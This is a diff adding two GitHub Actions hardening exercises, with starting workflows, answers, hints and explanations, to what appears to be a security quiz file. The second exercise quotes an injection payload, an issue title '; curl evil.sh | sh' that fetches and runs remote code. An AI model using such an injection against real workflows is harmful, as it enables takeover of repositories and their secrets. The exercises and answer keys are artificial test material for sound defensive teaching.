@@ -252,6 +252,43 @@
       "fix": "      - run: ./scripts/deploy.sh\n        env:\n          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}",
       "hint": "Look at how the token is read.",
       "answer": "The context is secrets, not secret: ${{ secret.DEPLOY_TOKEN }} is an unknown context and the workflow is invalid. Better still, pass the secret through env: rather than on the command line, so it is never part of the command text."
+    },
+    {
+      "q": "Fix this file: this workflow deploys on every push and every pull request, even when the tests fail, with a token that can write to the repository. Make every check pass: deploy only after the tests, only from main.",
+      "type": "fixfile",
+      "code": "yaml",
+      "rules": [
+        "gha-pinned",
+        "gha-permissions",
+        {
+          "id": "gha-needs",
+          "job": "deploy",
+          "needs": "test"
+        },
+        {
+          "id": "gha-branch",
+          "job": "deploy"
+        }
+      ],
+      "start": "name: ci\non:\n  push:\n  pull_request:\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@main\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 22\n          cache: npm\n      - run: npm ci\n      - run: npm test\n\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: ./scripts/deploy.sh\n        env:\n          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}",
+      "answer": "name: ci\non:\n  push:\n  pull_request:\n\npermissions:\n  contents: read\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 22\n          cache: npm\n      - run: npm ci\n      - run: npm test\n\n  deploy:\n    needs: test\n    if: github.event_name == 'push' && github.ref == 'refs/heads/main'\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: ./scripts/deploy.sh\n        env:\n          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}",
+      "hint": "deploy needs: test, and if: github.event_name == 'push' && github.ref == 'refs/heads/main'. A permissions: block with contents: read; checkout pinned to @v4.",
+      "explain": "Jobs run in parallel unless needs: chains them: without it, deploy ran while the tests were still running (or failing). The if: keeps pull requests and other branches to the test job. permissions: contents: read gives the GITHUB_TOKEN read-only access (the deploy uses its own secret). @main follows whatever is pushed to that branch of the action: pin a release tag, or better a full commit SHA, which nobody can move (GitHub's hardening guide recommends it, and Dependabot can keep SHAs up to date)."
+    },
+    {
+      "q": "Fix this file: this triage workflow leaks a webhook URL, can be hijacked by an issue title such as \"; curl evil.sh | sh\", and gives its token every right. Make every check pass (the URL is stored as the repository secret CHAT_WEBHOOK_URL; the job only labels issues).",
+      "type": "fixfile",
+      "code": "yaml",
+      "rules": [
+        "gha-secrets",
+        "gha-injection",
+        "gha-permissions",
+        "gha-pinned"
+      ],
+      "start": "name: triage\non:\n  issues:\n    types: [opened]\n\npermissions: write-all\n\njobs:\n  notify:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Post to the team chat\n        env:\n          CHAT_WEBHOOK_URL: https://chat.example.com/hooks/T01/B02/kq9Xz7\n        run: |\n          curl -sS -X POST \"$CHAT_WEBHOOK_URL\" \\\n            --data-urlencode \"text=New issue: ${{ github.event.issue.title }}\"\n      - uses: actions/github-script@main\n        with:\n          script: |\n            await github.rest.issues.addLabels({\n              ...context.repo, issue_number: context.issue.number, labels: [\"triage\"] })",
+      "answer": "name: triage\non:\n  issues:\n    types: [opened]\n\npermissions:\n  issues: write\n\njobs:\n  notify:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Post to the team chat\n        env:\n          CHAT_WEBHOOK_URL: ${{ secrets.CHAT_WEBHOOK_URL }}\n          ISSUE_TITLE: ${{ github.event.issue.title }}\n        run: |\n          curl -sS -X POST \"$CHAT_WEBHOOK_URL\" \\\n            --data-urlencode \"text=New issue: $ISSUE_TITLE\"\n      - uses: actions/github-script@v7\n        with:\n          script: |\n            await github.rest.issues.addLabels({\n              ...context.repo, issue_number: context.issue.number, labels: [\"triage\"] })",
+      "hint": "Move the issue title into env: (ISSUE_TITLE: ${{ github.event.issue.title }}) and use \"$ISSUE_TITLE\" in the script. permissions: issues: write.",
+      "explain": "${{ … }} is pasted into the script before the shell runs it, so a title containing \" or $( ) becomes code (script injection: anyone who can open an issue runs commands with your token and secrets). Passed through env:, the title is just the value of a variable. A webhook URL is a password: whoever has it posts in your chat, and a URL committed to Git stays in the history (rotate it). Secrets are masked in the logs. The job only needs to label issues: issues: write, nothing else. And an action used with write rights is pinned, never @main."
     }
   ],
   "interview": [
